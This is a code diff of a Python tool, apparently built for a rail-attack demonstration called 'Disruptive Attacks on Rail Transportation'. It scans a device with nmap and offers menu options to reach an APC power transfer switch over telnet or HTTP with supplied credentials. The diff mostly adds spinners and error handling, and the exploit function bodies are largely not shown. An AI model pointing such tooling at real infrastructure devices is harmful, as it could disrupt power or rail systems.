@@ -1,5 +1,5 @@
-#A script to reset the APS Power Transfer Switch, used as part of the train demo aka Project D.A.R.T. (Damn, a real train).
-#Written by Paul Oates
+#A script to reset the APS Power Transfer Switch, used as part of the train demo aka Project D.A.R.T. (Distruptive Attacks on Rail Transportation)
+#Written by Christopher Di-Nozzi
 
 #TODO
 #Scan entire network for APC devices.
@@ -12,11 +12,14 @@ import socket
 import re
 import os
 import random
+from halo import Halo
 
 def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
 def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
 def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
 def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
+
+spinner = Halo(text_color='green',spinner='bouncingBar')
 
 
 #url="http://192.168.1.20"
@@ -24,29 +27,37 @@ def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
 
 def recon(ip):
     nm = nmap.PortScanner()
-    prGreen('[*] Running active scan...')
+    #prGreen('[*] Running active scan...')
+    spinner.text = 'Running active scan agaisnt: '+ip
+    spinner.start()
     host = nm.scan(ip, arguments='-O -sV')
-    
+    spinner.succeed()
     print('\n')
-    prGreen("[+] OS: "+host['scan'][IP]['osmatch'][0]['name'])
+    prGreen("[+] OS: "+host['scan'][ip]['osmatch'][0]['name'])
     prGreen('===========================')
-    #print(host['scan'][IP]['tcp'])
-    for port in host['scan'][IP]['tcp']:
+    for port in host['scan'][ip]['tcp']:
         prGreen('[+] Port Number: ' +str(port))
-        prGreen('[+] State: '+host['scan'][IP]['tcp'][port]['state'])
-        prGreen('[+] Service: '+host['scan'][IP]['tcp'][port]['name'])
-        prGreen('[+] Product: '+host['scan'][IP]['tcp'][port]['product'])
+        prGreen('[+] State: '+host['scan'][ip]['tcp'][port]['state'])
+        prGreen('[+] Service: '+host['scan'][ip]['tcp'][port]['name'])
+        prGreen('[+] Product: '+host['scan'][ip]['tcp'][port]['product'])
         print('\n')
 
 def exploit_telnet(ip, username,password):
-    IP = ip
     PORT = 23
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        print('[*] Creating socket connection to: '+IP+":"+str(PORT))
-        time.sleep(1)
-        s.connect((IP,PORT))
 
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        #print('[*] Creating socket connection to: '+IP+":"+str(PORT))
+        spinner.text="Creating socket connection to: "+ip+":"+str(PORT)
+        spinner.start()
+        time.sleep(1)
+        try:
+            s.connect((ip,PORT))
+        except socket.error:
+            spinner.color="red"
+            spinner.fail("Could not connect to "+ip+":"+str(PORT))
+            return
         
+        spinner.succeed()
         prGreen('[+] Getting data from server...')
 
         res = s.recv(2048)
@@ -162,11 +173,10 @@ def exploit_http(ip, username,password):
     if 'You are now logged off.' in response.text:
         prGreen('[+] Logged out.')
 
-
 def print_banner():
     fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
     banner = Figlet(font=random.choice(fonts),width=1000)
-    prCyan(banner.renderText('D . A . R . T .'))
+    prCyan(banner.renderText('D. A. R. T.'))
 
 def print_menu():
     os.system('clear')
@@ -178,27 +188,32 @@ def print_menu():
     prRed('0) Exit')
 
     print('Enter your option: ')
-    i = int(input())
+    try:
+        i = int(input())
+        if i == 1:
+            ip = str(input("Enter IP of device: "))
+            recon(ip)
+            input("Press any key to return to menu...")
+        elif i==2:
+            ip = str(input("Enter IP of device: "))
+            username = str(input('Enter username: '))
+            password = str(input('Enter password: '))
+            exploit_telnet(ip,username,password)
+        elif i==3:
+            ip = str(input("Enter IP of device: "))
+            username = str(input('Enter username: '))
+            password = str(input('Enter password: '))
+            exploit_http(ip,username,password)
+        elif i==0:
+            exit()
+        else:
+            print("Invalid input, try again.")
 
-    if i == 1:
-        ip = str(input("Enter IP of device: "))
-        recon(ip)
-        input("Press any key to return to menu...")
-    elif i==2:
-        ip = str(input("Enter IP of device: "))
-        username = str(input('Enter username: '))
-        password = str(input('Enter password: '))
-        exploit_telnet(ip,username,password)
-    elif i==3:
-        ip = str(input("Enter IP of device: "))
-        username = str(input('Enter username: '))
-        password = str(input('Enter password: '))
-        exploit_http(ip,username,password)
-    elif i==0:
-        exit()
-    else:
-        print("Invalid input, try again.")
+    except ValueError:
+        print("Invalid input, please enter a number")
     
+    input("Press any key to return to menu...")
+
     print_menu()
 
 def main():
